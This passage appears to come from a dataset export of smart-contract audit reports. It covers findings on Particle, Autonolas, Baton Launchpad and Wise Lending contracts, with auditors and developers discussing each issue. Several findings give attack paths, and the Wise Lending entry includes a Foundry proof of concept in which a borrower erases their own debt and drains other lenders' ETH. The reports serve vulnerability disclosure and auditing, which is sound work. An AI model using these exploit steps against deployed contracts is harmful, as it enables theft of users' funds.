>     }
> 
>     {
>         bytes memory callData = abi.encodePacked(caller.callBytes.selector, bytes12(0), msg.sender, data);
>         // solhint-disable-next-line avoid-low-level-calls
>         (bool success, bytes memory result) = address(caller).call{value: msg.value}(callData);
>         if (!success) {
>             revert(RevertReasonParser.parse(result, ""callBytes failed: ""));
>         }
>     }
> 
>     uint256 spentAmount = desc.amount;
>     returnAmount = dstToken.uniBalanceOf(address(this));
> 
>     if (flags & _PARTIAL_FILL != 0) {
>         uint256 unspentAmount = srcToken.uniBalanceOf(address(this));
>         if (unspentAmount > 0) {
>             spentAmount = spentAmount.sub(unspentAmount);
>             srcToken.uniTransfer(msg.sender, unspentAmount);
>         }
>         require(returnAmount.mul(desc.amount) >= desc.minReturnAmount.mul(spentAmount), ""Return amount is not enough"");
>     } else {
>         require(returnAmount >= desc.minReturnAmount, ""Return amount is not enough"");
>     }
> 
>     address payable dstReceiver = (desc.dstReceiver == address(0)) ? msg.sender : desc.dstReceiver;
>     dstToken.uniTransfer(dstReceiver, returnAmount);
> 
>     emit Swapped(
>         msg.sender,
>         srcToken,
>         dstToken,
>         dstReceiver,
>         spentAmount,
>         returnAmount
>     );
> 
>     gasLeft = gasleft();
> }
> ```
> The router has been approved as a spender and can therefore transfer `desc.amount` to `desc.srcReceiver`. Subsequently, an external call is made `caller` which is also controlled by the liquidator. Here, they would simply have to perform the swap themselves and transfer the expected amount back to the contract. Keeping any excess. This is an issue for `AggregationRouterV4` and I would expect there are similar types of issues in other DEX aggregator contracts.
>
 > `AggregationRouterV5` is also vulnerable to the same issue.
> 
> ```solidity
> function swap(
>     IAggregationExecutor executor,
>     SwapDescription calldata desc,
>     bytes calldata permit,
>     bytes calldata data
> )
>     external
>     payable
>     returns (
>         uint256 returnAmount,
>         uint256 spentAmount
>     )
> {
>     if (desc.minReturnAmount == 0) revert ZeroMinReturn();
> 
>     IERC20 srcToken = desc.srcToken;
>     IERC20 dstToken = desc.dstToken;
> 
>     bool srcETH = srcToken.isETH();
>     if (desc.flags & _REQUIRES_EXTRA_ETH != 0) {
>         if (msg.value <= (srcETH ? desc.amount : 0)) revert RouterErrors.InvalidMsgValue();
>     } else {
>         if (msg.value != (srcETH ? desc.amount : 0)) revert RouterErrors.InvalidMsgValue();
>     }
> 
>     if (!srcETH) {
>         if (permit.length > 0) {
>             srcToken.safePermit(permit);
>         }
>         srcToken.safeTransferFrom(msg.sender, desc.srcReceiver, desc.amount);
>     }
> 
>     _execute(executor, msg.sender, desc.amount, data);
> 
>     spentAmount = desc.amount;
>     // we leave 1 wei on the router for gas optimisations reasons
>     returnAmount = dstToken.uniBalanceOf(address(this));
>     if (returnAmount == 0) revert ZeroReturnAmount();
>     unchecked { returnAmount--; }
> 
>     if (desc.flags & _PARTIAL_FILL != 0) {
>         uint256 unspentAmount = srcToken.uniBalanceOf(address(this));
>         if (unspentAmount > 1) {
>             // we leave 1 wei on the router for gas optimisations reasons
>             unchecked { unspentAmount--; }
>             spentAmount -= unspentAmount;
>             srcToken.uniTransfer(payable(msg.sender), unspentAmount);
>         }
>         if (returnAmount * desc.amount < desc.minReturnAmount * spentAmount) revert RouterErrors.ReturnAmountIsNotEnough();
>     } else {
>         if (returnAmount < desc.minReturnAmount) revert RouterErrors.ReturnAmountIsNotEnough();
>     }
> 
>     address payable dstReceiver = (desc.dstReceiver == address(0)) ? payable(msg.sender) : desc.dstReceiver;
>     dstToken.uniTransfer(dstReceiver, returnAmount);
> }
> ```
 > As such, I think this is vulnerable to all erc20 tokens.

**[wukong-particle (Particle) commented](https://github.com/code-423n4/2023-12-particle-findings/issues/26#issuecomment-1869182189):**
 > Hmm ok I see, this is more like a malicious pool attack rather than malicious erc20 token attack. It's using the vulnerability from swap aggregator (e.g. the arbitrary call of `address(caller).call{value: msg.value}(callData);` in `AggregationRouterV5`.
> 
> To fix this, we can restrict the `DEX_AGGREGATOR` to be Uniswap's `SwapRouter` (deployed at 0xE592427A0AEce92De3Edee1F18E0157C05861564 on mainnet). This router interacts with Uniswap only (it has multicall, so we can use `data` to choose multi-path if needed). 
> 
> Will this resolve this vulnerability? @0xleastwood @adriro @bin2chen 

**[bin2chen (Warden) commented](https://github.com/code-423n4/2023-12-particle-findings/issues/26#issuecomment-1869320390):**
 > @wukong-particle I‚Äôm sorry, I didn‚Äôt quite understand what you mean. In the POC, it use Uniswap‚Äôs SwapRouter and Pool.
> 
> In my personal understanding, if the liquidator still passes in `data`, then we need to check the security of this data, but it‚Äôs quite difficult to check.
> So I still keep my opinion, `liquidatePosition()` ignores the incoming `data`, and the method constructs data internally, which is how to determine the swap slippage is a problem.


**[wukong-particle (Particle) confirmed and commented](https://github.com/code-423n4/2023-12-particle-findings/issues/26#issuecomment-1869346691):**
 > Ok understood, based on the PoC provided here and the 1inch v5 vulnerability raised by the judge, I think we should remove the raw data from input parameters altogether. We will use direct swap (with the fee as input to select which pool to execute the swap). Thanks for the discussion! 

**[0xleastwood (Judge) commented](https://github.com/code-423n4/2023-12-particle-findings/issues/26#issuecomment-1869398044):**
 > So Uniswap's `SwapRouter` contract is vulnerable to something slightly different. We can control the path at which tokens are swapped, stealing any profit along the way. Additionally, all DEX aggregators would be prone to sandwich attacks. 
> 
> I think there can be some better input validation when it comes to performing the actual swap. If possible we should try to avoid any swaps during liquidation as this leaves the protocol open to potential bad debt accrual and issues with slippage control. Validating slippage impacts the liveness of liquidations so that is also not an ideal solution. It really depends on what should be prioritised here?

***",Particle Protocol,immeas|bin2chen|adriro|1|2,HIGH,,24150,0,0,0,https://github.com/code-423n4/2023-12-particle-findings/issues/26,https://code4rena.com/reports/2023-12-particle,,https://code4rena.com/reports/2023-12-particle,solodit_reports,99418945455e0bc69af4e51038557edc,2024-01-29 21:10:47,2024-10-15 00:58:29,1,,Dexes
1505134,865dfe0874c3fed0d1587abbd92209ea,[H-05] Withdrawals can be frozen by creating null deposits,Code4rena,2023-12-21,"It won't be possible to withdraw any LP token after doing a deposit of $0$ liquidity, leading to withdrawals being effectively freezed.

### Proof of Concept

In [**liquidity_lockbox, function withdraw**](https://github.com/code-423n4/2023-12-autonolas/blob/2a095eb1f8359be349d23af67089795fb0be4ed1/lockbox-solana/solidity/liquidity_lockbox.sol#L221C1-L225C10)

```solidity
        ...

        uint64 positionLiquidity = mapPositionAccountLiquidity[positionAddress];
        // Check that the token account exists
        if (positionLiquidity == 0) {
            revert(""No liquidity on a provided token account"");
        }

        ...
```

The code checks for the existence of a position via the recorded liquidity. This is a clever idea, as querying a non-existant value from a mapping will return $0$. However, in `deposit`, due to a flawed input validation, it is possible to make positions with $0$ liquidity as the only check being done is for liquidity to not be higher than `type(uint64).max`:

[**liquidity_lockbox, function \_getPositionData**](https://github.com/code-423n4/2023-12-autonolas/blob/2a095eb1f8359be349d23af67089795fb0be4ed1/lockbox-solana/solidity/liquidity_lockbox.sol#L94C1-L97C10)

```solidity
        ...

        // Check that the liquidity is within uint64 bounds
        if (positionData.liquidity > type(uint64).max) {
            revert(""Liquidity overflow"");
        }

        ...
```

As it will pass the input validation inside `_getPositionData`, the only way for such a tx to revert is in the [transfer](https://github.com/code-423n4/2023-12-autonolas/blob/2a095eb1f8359be349d23af67089795fb0be4ed1/lockbox-solana/solidity/liquidity_lockbox.sol#L164)/[mint](https://github.com/code-423n4/2023-12-autonolas/blob/2a095eb1f8359be349d23af67089795fb0be4ed1/lockbox-solana/solidity/liquidity_lockbox.sol#L171), which are low-level calls with no checks for success, as stated in my report `Missing checks for failed calls to the token program will corrupt user's positions`.

Due to the reasons above, this deposit with $0$ liquidity will be treated as a valid one and will be stored inside the `mapPositionAccountLiquidity` and `positionAccounts` arrays. If we add the fact that withdrawals are done by looping **LINEARLY** through `positionAccounts`:

[**liquidity_lockbox, function withdraw**](https://github.com/code-423n4/2023-12-autonolas/blob/2a095eb1f8359be349d23af67089795fb0be4ed1/lockbox-solana/solidity/liquidity_lockbox.sol#L192C1-L323C6)

```solidity
    function withdraw(uint64 amount) external {
        address positionAddress = positionAccounts[firstAvailablePositionAccountIndex]; // @audit linear loop
        
        ...

        uint64 positionLiquidity = mapPositionAccountLiquidity[positionAddress];
        // Check that the token account exists
        if (positionLiquidity == 0) { // @audit it will revert here once it reaches the flawed position
            revert(""No liquidity on a provided token account"");
        }

        ...

        if (remainder == 0) { // @audit if the liquidity after the orca call is 0, close the position and ++ the index
            ...

            // Increase the first available position account index
            firstAvailablePositionAccountIndex++; // @audit it won't reach here as the revert above will roll-back the whole tx
        }
    }
```

It can be seen that once it encounters such a *""fake""* deposit with $0$ liquidity provided, it will always revert due to the existence check. As there is no other way to update `firstAvailablePositionAccountIndex` to bypass the flawed position, withdrawals will be completely freezed.

### Recommended Mitigation Steps

Just check for the supplied liquidity to not be $0$ in

[**liquidity_lockbox, function \_getPositionData**](https://github.com/code-423n4/2023-12-autonolas/blob/2a095eb1f8359be349d23af67089795fb0be4ed1/lockbox-solana/solidity/liquidity_lockbox.sol#L94C1-L97C10)

```diff
        ...
+       // Check that the liquidity > 0
+       if (positionData.liquidity == 0) {
+           revert(""Liquidity cannot be 0"");
+       }

        // Check that the liquidity is within uint64 bounds
        if (positionData.liquidity > type(uint64).max) {
            revert(""Liquidity overflow"");
        }

        ...
```

**[mariapiamo (Olas) confirmed](https://github.com/code-423n4/2023-12-autonolas-findings/issues/341#issuecomment-1892165566)**

***",Olas,erebus|hash|BugzyVonBuggernaut,HIGH,,90500,0,0,0,https://github.com/code-423n4/2023-12-autonolas-findings/issues/341,https://code4rena.com/reports/2023-12-autonolas,,https://code4rena.com/reports/2023-12-autonolas,solodit_reports,93c9bbb78af223459c892e4c04c210df,2024-02-08 21:10:27,2024-10-15 01:01:00,1,"uint64 positionLiquidity = mapPositionAccountLiquidity[positionAddress];
        // Check that the token account exists
        if (positionLiquidity == 0) {
            revert(""No liquidity on a provided token account"");
        }
```
        // Check that the liquidity is within uint64 bounds
        if (positionData.liquidity > type(uint64).max) {
            revert(""Liquidity overflow"");
        }
```
        SplToken.transfer(
```
        SplToken.pda_mint_to(
```
    /// @dev Withdraws LP tokens separately to each token ATA and burns provided bridge tokens.
    /// @param amount Bridged token amount.
    @mutableAccount(pool)
    @account(tokenProgramId)
    @mutableAccount(position)
    @mutableAccount(userBridgedTokenAccount)
    @mutableAccount(pdaBridgedTokenAccount)
    @mutableAccount(userWallet)
    @mutableAccount(bridgedTokenMint)
    @mutableAccount(pdaPositionAccount)
    @mutableAccount(userTokenAccountA)
    @mutableAccount(userTokenAccountB)
    @mutableAccount(tokenVaultA)
    @mutableAccount(tokenVaultB)
    @mutableAccount(tickArrayLower)
    @mutableAccount(tickArrayUpper)
    @mutableAccount(positionMint)
    @signer(sig)
    function withdraw(uint64 amount) external {
        address positionAddress = positionAccounts[firstAvailablePositionAccountIndex];
        if (positionAddress != tx.accounts.position.key) {
            revert(""Wrong liquidity token account"");
        }

        address pdaPositionAta = tx.accounts.pdaPositionAccount.key;
        if (mapPositionAccountPdaAta[positionAddress] != pdaPositionAta) {
            revert(""Wrong position ATA"");
        }

        uint64 positionLiquidity = mapPositionAccountLiquidity[positionAddress];
        // Check that the token account exists
        if (positionLiquidity == 0) {
            revert(""No liquidity on a provided token account"");
        }

        // Check the requested amount to be smaller or equal than the position liquidity
        if (amount > positionLiquidity) {
            revert(""Amount exceeds a position liquidity"");
        }

        // Check the pdaBridgedTokenAccount address
        if (tx.accounts.pdaBridgedTokenAccount.key != pdaBridgedTokenAccount) {
            revert(""Wrong PDA bridged token ATA"");
        }

        // Check that the pool is correct
        if (tx.accounts.pool.key != pool) {
            revert(""Pool address is incorrect"");
        }

        // Check that the bridged token mint account is correct
        if (tx.accounts.bridgedTokenMint.key != bridgedTokenMint) {
            revert(""Wrong bridged token mint account"");
        }

        // Transfer bridged tokens to the pdaBridgedTokenAccount address of this program
        SplToken.transfer(
            tx.accounts.userBridgedTokenAccount.key,
            pdaBridgedTokenAccount,
            tx.accounts.userWallet.key,
            amount);

        // Decrease the total liquidity amount
        totalLiquidity -= amount;

        // Burn acquired bridged tokens
        SplToken.pda_burn(pdaBridgedTokenAccount, bridgedTokenMint, pdaProgram, amount, pdaProgramSeed, pdaBump);

        // Decrease the position liquidity
        AccountMeta[11] metasDecreaseLiquidity = [
            AccountMeta({pubkey: pool, is_writable: true, is_signer: false}),
            AccountMeta({pubkey: SplToken.tokenProgramId, is_writable: false, is_signer: false}),
            AccountMeta({pubkey: pdaProgram, is_writable: false, is_signer: true}),
            AccountMeta({pubkey: positionAddress, is_writable: true, is_signer: false}),
            AccountMeta({pubkey: pdaPositionAta, is_writable: false, is_signer: false}),
            AccountMeta({pubkey: tx.accounts.userTokenAccountA.key, is_writable: true, is_signer: false}),
            AccountMeta({pubkey: tx.accounts.userTokenAccountB.key, is_writable: true, is_signer: false}),
            AccountMeta({pubkey: tx.accounts.tokenVaultA.key, is_writable: true, is_signer: false}),
            AccountMeta({pubkey: tx.accounts.tokenVaultB.key, is_writable: true, is_signer: false}),
            AccountMeta({pubkey: tx.accounts.tickArrayLower.key, is_writable: true, is_signer: false}),
            AccountMeta({pubkey: tx.accounts.tickArrayUpper.key, is_writable: true, is_signer: false})
        ];
        // a026d06f685b2c01 - decreaseLiquidity, eff0ae00000000000000000000000000 - amount, aaf1950200000000 - minA, b8522d0000000000 - minB
        // bytes bincode = ""0xa026d06f685b2c01eff0ae00000000000000000000000000aaf1950200000000b8522d0000000000"";
        // orca.call{accounts: metasDecreaseLiquidity, seeds: [[pdaProgramSeed, pdaBump]]}(bincode);
        whirlpool.decreaseLiquidity{accounts: metasDecreaseLiquidity, seeds: [[pdaProgramSeed, pdaBump]]}(amount, 0, 0);

        // Update the token remainder
        uint64 remainder = positionLiquidity - amount;
        // Update liquidity and its associated position account
        mapPositionAccountLiquidity[positionAddress] = remainder;

        // If requested amount can be fully covered by the current position liquidity, close the position
        if (remainder == 0) {
            // Update fees for the position
            AccountMeta[4] metasUpdateFees = [
                AccountMeta({pubkey: pool, is_writable: true, is_signer: false}),
                AccountMeta({pubkey: positionAddress, is_writable: true, is_signer: false}),
                AccountMeta({pubkey: tx.accounts.tickArrayLower.key, is_writable: false, is_signer: false}),
                AccountMeta({pubkey: tx.accounts.tickArrayUpper.key, is_writable: false, is_signer: false})
            ];
            whirlpool.updateFeesAndRewards{accounts: metasUpdateFees, seeds: [[pdaProgramSeed, pdaBump]]}();

            // Collect fees from the position
            AccountMeta[9] metasCollectFees = [
                AccountMeta({pubkey: pool, is_writable: true, is_signer: false}),
                AccountMeta({pubkey: pdaProgram, is_writable: false, is_signer: true}),
                AccountMeta({pubkey: positionAddress, is_writable: true, is_signer: false}),
                AccountMeta({pubkey: pdaPositionAta, is_writable: false, is_signer: false}),
                AccountMeta({pubkey: tx.accounts.userTokenAccountA.key, is_writable: true, is_signer: false}),
                AccountMeta({pubkey: tx.accounts.tokenVaultA.key, is_writable: true, is_signer: false}),
                AccountMeta({pubkey: tx.accounts.userTokenAccountB.key, is_writable: true, is_signer: false}),
                AccountMeta({pubkey: tx.accounts.tokenVaultB.key, is_writable: true, is_signer: false}),
                AccountMeta({pubkey: SplToken.tokenProgramId, is_writable: false, is_signer: false})
            ];
            whirlpool.collectFees{accounts: metasCollectFees, seeds: [[pdaProgramSeed, pdaBump]]}();

            // Close the position
            AccountMeta[6] metasClosePosition = [
                AccountMeta({pubkey: pdaProgram, is_writable: false, is_signer: true}),
                AccountMeta({pubkey: tx.accounts.userWallet.key, is_writable: true, is_signer: false}),
                AccountMeta({pubkey: positionAddress, is_writable: true, is_signer: false}),
                AccountMeta({pubkey: tx.accounts.positionMint.key, is_writable: true, is_signer: false}),
                AccountMeta({pubkey: pdaPositionAta, is_writable: true, is_signer: false}),
                AccountMeta({pubkey: SplToken.tokenProgramId, is_writable: false, is_signer: false})
            ];
            whirlpool.closePosition{accounts: metasClosePosition, seeds: [[pdaProgramSeed, pdaBump]]}();

            // Increase the first available position account index
            firstAvailablePositionAccountIndex++;
        }
    }",
1625291,a16303c356fc506ce513f67e4a4aaff0,[H-01] Missing user input validation can lead to stuck funds,Pashov Audit Group,2023-07-01,"**Severity**

**Impact:**
High, as all mint fees can be stuck forever

**Likelihood:**
Medium, as users can easily misconfigure inputs

**Description**

There are multiple insufficiencies in the input validation of the arguments of the `initialize` method in `Nft`:

1. The sum of the `supply` of all `categories_` can be less than the `maxMintSupply_` - this would lead to the mint never completing, which results in all of the ETH in the `Nft` contract coming from mints so far being stuck in it forever
2. The `duration` of the `vestingParams_` should have a lower and upper bound as for example a too big of a duration can mean vesting can never complete or a division rounding error
3. The `mintEndTimestamp` of `refundParams_` should not be too further away in the future otherwise refund & vesting mechanisms would never work, and if it is too close then the mint mechanism won't work.

**Recommendations**

Add a validation that the sum of all categories' supply is more than or equal to the `maxMintSupply`. Also add sensible upper and lower bounds for both `duration` for the vesting mechanism and `mintEndTimestamp` for the refund mechanism.",Baton Launchpad,Pashov,HIGH,Missing Check,,0,0,0,,https://github.com/solodit/solodit_content/blob/main/reports/Pashov/2023-07-01-Baton Launchpad.md,,,solodit_reports,,2024-03-11 21:10:21,2024-10-14 23:57:39,1,,Launchpad
1775809,bec84532c10b574adfde6d89bcd56eb5,[H-02] User can erase their position debt for free,Code4rena,2024-02-21,"<https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/FeeManager/FeeManager.sol#L816-L866>

<https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/MainHelper.sol#L667-L727>

### Vulnerability details

When the pool token stops being used in the position, the `_removePositionData` function is called. However, it assumes that `poolToken` that is passed as a parameter always exists in user token array, which is not always the case. In the case of function `FeeManager.paybackBadDebtNoReward()`, which indirectly calls `_removePositionData`, insufficient validation doesn't check if repay token is in user array, which results in zeroing out information about user debt.

### Impact

Free elimination of user debt.

### Proof of Concept

First, let's see how `MainHelper._removePositionData()` works:

```javascript
    function _removePositionData(
        uint256 _nftId,
        address _poolToken,
        function(uint256) view returns (uint256) _getPositionTokenLength,
        function(uint256, uint256) view returns (address) _getPositionTokenByIndex,
        function(uint256, address) internal _deleteLastPositionData,
        bool isLending
    )
        private
    {
        uint256 length = _getPositionTokenLength(
            _nftId
        );

        if (length == 1) {
            _deleteLastPositionData(
                _nftId,
                _poolToken
            );

            return;
        }

        uint8 i;
        uint256 endPosition = length - 1;

        while (i < length) {

            if (i == endPosition) {
                _deleteLastPositionData(
                    _nftId,
                    _poolToken
                );

                break;
            }

            if (_getPositionTokenByIndex(_nftId, i) != _poolToken) {
                unchecked {
                    ++i;
                }
                continue;
            }

            address poolToken = _getPositionTokenByIndex(
                _nftId,
                endPosition
            );

            isLending == true
                ? positionLendTokenData[_nftId][i] = poolToken
                : positionBorrowTokenData[_nftId][i] = poolToken;

            _deleteLastPositionData(
                _nftId,
                _poolToken
            );

            break;
        }
    }
```

So, `_poolToken` sent in parameter is not checked if:

1. The position consists of only one token. Then the token is removed, no matter if it's `_poolToken` or not.
2. No token was found during the position token iteration. In which case, the last token is removed, no matter if it's `_poolToken` or not.

This function is called in `MainHelper._corePayback()`, which in turn is called in `FeeManager.paybackBadDebtNoReward() => WiseLending.corePaybackFeeManager() => WiseLending._handlePayback()`. The important factor is that `paybackBadDebtNoReward()` doesn't check if position utilizes  `_paybackToken` passed by the caller and allows it to pass any token. The only prerequisite is that `badDebtPosition[_nftId]` has to be bigger than `0`:

```javascript
    function paybackBadDebtNoReward(
        uint256 _nftId,
        address _paybackToken,
        uint256 _shares
    )
        external
        returns (uint256 paybackAmount)
    {
        updatePositionCurrentBadDebt(
            _nftId
        );

        if (badDebtPosition[_nftId] == 0) {
            return 0;
        }

        if (WISE_LENDING.getTotalDepositShares(_paybackToken) == 0) {
            revert PoolNotActive();
        }

        paybackAmount = WISE_LENDING.paybackAmount(
            _paybackToken,
            _shares
        );

        WISE_LENDING.corePaybackFeeManager(
            _paybackToken,
            _nftId,
            paybackAmount,
            _shares
        );

        _updateUserBadDebt(
            _nftId
        );
		// [...]
```

With these pieces of information, we can form following attack path:

1. Prepare a big position that will have be destined to have positive `badDebt`. For sake of the argument, let's assume it's `$1M` worth of ETH.
2. Prepare a very small position that will not be incentivized to be liquidated by liquidators, just to achieve non-zero `badDebt`. This can be done, for example, before significant price update transaction from Chainlink. Then take `$1M` worth of ETH flashloan and put this as collateral to position, borrowing as much as possible.
3. Call `FeeManager.paybackBadDebtNoReward()` on the position with desired position `nftId`, USDC token address and `0` shares as input params.
4. Because there is non-zero bad debt, the check will pass, and the logic will finally reach `MainHelper._corePayback()`. Because repay is `0` shares, the diminishing position size in USDC token will not underflow and position token will be tried to be removed:

```javascript
    function _corePayback(
        uint256 _nftId,
        address _poolToken,
        uint256 _amount,
        uint256 _shares
    )
        internal
    {
        _updatePoolStorage(
            _poolToken,
            _amount,
            _shares,
            _increaseTotalPool,
            _decreasePseudoTotalBorrowAmount,
            _decreaseTotalBorrowShares
        );

        _decreasePositionMappingValue(
            userBorrowShares,
            _nftId,
            _poolToken,
            _shares
        );

        if (userBorrowShares[_nftId][_poolToken] > 0) {
            return;
        }

        _removePositionData({
            _nftId: _nftId,
            _poolToken: _poolToken,
            _getPositionTokenLength: getPositionBorrowTokenLength,
            _getPositionTokenByIndex: getPositionBorrowTokenByIndex,
            _deleteLastPositionData: _deleteLastPositionBorrowData,
            isLending: false
        });
```

5. Inside `_removePositionData`, because position length is 1, no checks to confirm if the token address matches will be performed:

```javascript
        uint256 length = _getPositionTokenLength(
            _nftId
        );

        if (length == 1) {
            _deleteLastPositionData(
                _nftId,
                _poolToken
            );

            return;
        }
```

6. This means that all information about user borrows are deleted. Meaning, that now system thinks the user has `$1M` collateral, and no debt. Which means that the attacker just stole the entire borrowed amount.

### Recommended Mitigation Steps

Add verification if the token that is passed to `_removePositionData()` exists in user tokens. If not, revert the transaction.

### Assessed type

Invalid Validation

**[vonMangoldt (Wise Lending) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/215#issuecomment-2009516270):**
 > Double checking line of reasoning fails when user deposits large amount and then borrows.
> 
>> 1. Prepare big position that will have be destined to have positive `badDebt`. For sake of the argument, let's assume it's `$1M` worth of ETH.
>> 2. Prepare very small position that will not be incentivized to be liquidated by liquidators, just to achieve non-zero `badDebt`. This can be done for example before significant price update transaction from Chainlink. Then take `$1M` worth of ETH flashloan and put this as collateral to position, borrowing as much as possible.
>> 3. Call `FeeManager.paybackBadDebtNoReward()` on the position with desired position `nftId`, USDC token address and `0` shares as input params.
>> 4. Because there is non-zero bad debt, the check will pass, and and the logic will finally reach `MainHelper._corePayback()`. Because repay is `0` shares, diminishing position size in USDC token will not underflow, and position token will be tried to be removed:
> 
> Comment:
> 1. Ok say big position has `nftId` = 1.
> 2. Ok say small position has `nftId` = 2.
>
> `nftId` 2 now takes more collateral and borrows max:
> then calls `paybackBadDebtNoReward` with `nftId` 2.
> 
> But since collateral has been deposited and borrowed within non liquidation range (healthstate check active remember),
>
> This line here:
>
> ```
> updatePositionCurrentBadDebt(
>             _nftId
>         );
> ```
>
> in the beginning will set `badDebtPosition[_nft]` to `0` meaning it will exit after this line:
>
> ```
> if (badDebtPosition[_nftId] == 0) {
>     return 0;
>  }
>  ```
> 
> and no harm done.


**[deliriusz (warden) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/215#issuecomment-2026861525):**
 > @Trust - I have provided the coded PoC below. It shows that user is able to steal whole protocol funds, due to wrong algorithm in `_removePositionData()`. I managed to not use very big position and a single token, which makes this issue even easier to perform.
> 
> PoC provided below does the following:
> 1. Setup initial state - 2 lenders depositing 100 ETH each, and 1 borrower whose position will have bad debt. For the purpose of this test I chose market crash condition; however, using a small position that will give no incentives to liquidate it will also work.
> 2. Position is underwater and is liquidated in order to increase bad debt for user position. This is a prerequisite for being able to trigger bad debt repayment.
> 3. When bad debt repayment is triggered for a token that user didn't use, `_removePositionData()` removes last token in user borrow tokens. In this case that means that the user doesn't have any tokens in his debt tokens listed.
> 4. User borrows 95% of ALL ETH that the protocol holds. It's possible, because when performing health check at the end of borrow, all user borrow tokens are iterated through - and remember that we just removed the token.
> 5. At the end I verified that the user really got the funds, which proves that the issue is real.
>
><details>
> 
> ```javascript
> // SPDX-License-Identifier: -- WISE --
> 
> pragma solidity =0.8.24;
> 
> import ""./WiseLendingBaseDeployment.t.sol"";
> 
> contract DebtClearTest is BaseDeploymentTest {
>     address borrower = address(uint160(uint(keccak256(""alice""))));
>     address lender = address(uint160(uint(keccak256(""bob""))));
>     address lender2 = address(uint160(uint(keccak256(""bob2""))));
> 
>     uint256 depositAmountETH = 100 ether; // 10 ether
>     uint256 depositAmountToken = 10 ether; // 10 ether
>     uint256 borrowAmount = 5e18; // 5 ether
> 
>     uint256 nftIdLiquidator; // nftId of lender
>     uint256 nftIdLiquidatee; // nftId of borrower
> 
>     uint256 debtShares;
> 
>     function _setupIndividualTest() internal override {
>         _deployNewWiseLending(false);
> 
>         // set token value for simple calculations
>         MOCK_CHAINLINK_2.setValue(1 ether); // 1 token == 1 ETH
>         assertEq(MOCK_CHAINLINK_2.latestAnswer(), MOCK_CHAINLINK_ETH_ETH.latestAnswer());
>         vm.stopPrank();
>         
>         // fund lender and borrower
>         vm.deal(lender, depositAmountETH);
>         vm.deal(lender2, depositAmountETH);
>         deal(address(MOCK_WETH), lender, depositAmountETH);
>         deal(address(MOCK_ERC20_2), borrower, depositAmountToken * 2);
>         deal(address(MOCK_ERC20_1), lender, depositAmountToken * 2);
>     }
> 
>     function testRemovingToken() public {
>         IERC20 WETH = IERC20(LENDING_INSTANCE.WETH_ADDRESS());
>                 // lender supplies ETH
>         vm.startPrank(lender);
> 
>         nftIdLiquidator = POSITION_NFTS_INSTANCE.mintPosition();
> 
>         // deposit 100 ether into the pool
>         LENDING_INSTANCE.depositExactAmountETH{value: depositAmountETH}(nftIdLiquidator);
> 
>         vm.stopPrank();
> 
>         // prank second provider to make sure that the borrower is able to
>         // steal everyone's funds later
>         vm.startPrank(lender2);
> 
>         uint nftIdfundsProvider = POSITION_NFTS_INSTANCE.mintPosition();
> 
>         // deposit 100 ether into the pool
>         LENDING_INSTANCE.depositExactAmountETH{value: depositAmountETH}(nftIdfundsProvider);
> 
>         vm.stopPrank();
> 
>         // borrower supplies collateral token and borrows ETH
>         vm.startPrank(borrower);
> 
>         MOCK_ERC20_2.approve(address(LENDING_INSTANCE), depositAmountToken * 2);
> 
>         nftIdLiquidatee = POSITION_NFTS_INSTANCE.mintPosition();
>         
>         vm.warp(
>             block.timestamp + 10 days
>         );
> 
>         LENDING_INSTANCE.depositExactAmount( // supply collateral
>             nftIdLiquidatee, 
>             address(MOCK_ERC20_2), 
>             10
>         );
> 
>         debtShares = LENDING_INSTANCE.borrowExactAmountETH(nftIdLiquidatee, borrowAmount); // borrow ETH
> 
>         vm.stopPrank();
> 
>         // shortfall event/crash occurs. This is just one of the possibilities of achieving bad debt
>         // second is maintaining small position that gives no incentive to liquidate it.
>         vm.prank(MOCK_DEPLOYER);
>         MOCK_CHAINLINK_2.setValue(0.3 ether);
> 
>         // borrower gets partially liquidated
>         vm.startPrank(lender);
> 
>         MOCK_WETH.approve(address(LENDING_INSTANCE), depositAmountETH);
> 
>         LENDING_INSTANCE.liquidatePartiallyFromTokens(
>             nftIdLiquidatee,
>             nftIdLiquidator, 
>             address(MOCK_WETH),
>             address(MOCK_ERC20_2),
>             debtShares * 2e16 / 1e18 + 1 
>         );
> 
>         vm.stopPrank();
> 
>         // global and user bad debt is increased
>         uint256 totalBadDebt = FEE_MANAGER_INSTANCE.totalBadDebtETH();
>         uint256 userBadDebt = FEE_MANAGER_INSTANCE.badDebtPosition(nftIdLiquidatee);
> 
>         assertGt(totalBadDebt, 0); 
>         assertGt(userBadDebt, 0);
>         assertEq(totalBadDebt, userBadDebt); // user bad debt and global bad debt are the same
> 
>         vm.startPrank(lender);
> 
>         MOCK_ERC20_1.approve(address(LENDING_INSTANCE), type(uint256).max);
>         MOCK_ERC20_1.approve(address(FEE_MANAGER_INSTANCE), type(uint256).max);
>         MOCK_WETH.approve(address(FEE_MANAGER_INSTANCE), type(uint256).max);
>         
>         // check how much tokens the position that will be liquidated has
>         uint256 lb = LENDING_INSTANCE.getPositionBorrowTokenLength(
>             nftIdLiquidatee
>         );
> 
>         assertEq(lb, 1);
> 
>         uint256 ethValueBefore = SECURITY_INSTANCE.getETHBorrow(
>             nftIdLiquidatee,
>             address(MOCK_ERC20_2)
>         );
> 
>         console.log(""ethBefore "", ethValueBefore);
> 
>         // **IMPORTANT** this is the core of the issue
>         // When bad debt occurs, there are 2 critical checks missing:
>         // 1. that the amount to repay is bigger than 0
>         // 2. that the token to repay bad debt has the bad debt for user
>         // This allows to remove any token from the list of user borrow tokens,
>         // because of how finding token to remove algorithm is implemented:
>         // it iterates over all the tokens and if it doesn't find matching one
>         // until it reaches last, it wrongly assumes that the last token is the
>         // one that should be removed.
>         // And not checking for amount of repayment allows to skip Solidity underflow 
>         // checks on diminishing user bad debt.
>         FEE_MANAGER_INSTANCE.paybackBadDebtNoReward(
>             nftIdLiquidatee, 
>             address(MOCK_ERC20_1), // user doesn't have debt in this token
>             0
>         );
> 
>         uint256 ethValueAfter = SECURITY_INSTANCE.getETHBorrow(
>             nftIdLiquidatee,
>             address(MOCK_ERC20_2)
>         );
>         uint256 ethWethValueAfter = SECURITY_INSTANCE.getETHBorrow(
>             nftIdLiquidatee,
>             address(WETH)
>         );
>         console.log(""ethAfter "", ethValueAfter);
> 
>         // assert that the paybackBadDebtNoReward removed token that it shouldn't
>         uint256 la = LENDING_INSTANCE.getPositionBorrowTokenLength(
>             nftIdLiquidatee
>         );
